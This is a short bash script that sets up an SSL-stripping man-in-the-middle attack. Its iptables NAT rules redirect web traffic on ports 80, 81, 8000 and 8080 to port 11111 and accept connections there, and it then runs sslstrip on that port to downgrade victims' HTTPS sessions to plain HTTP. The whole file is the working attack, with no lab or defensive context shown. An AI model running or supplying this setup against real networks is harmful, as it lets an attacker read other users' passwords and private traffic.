#!/usr/bin/env bash
iptables -t nat -A PREROUTING -p tcp -m multiport --destination-port 80,81,8000,8080 -j REDIRECT --to-port 11111
iptables -t nat -L PREROUTING
iptables -I INPUT 1 -p tcp --destination-port 11111 -j ACCEPT
iptables -L INPUT
sslstrip -l 11111
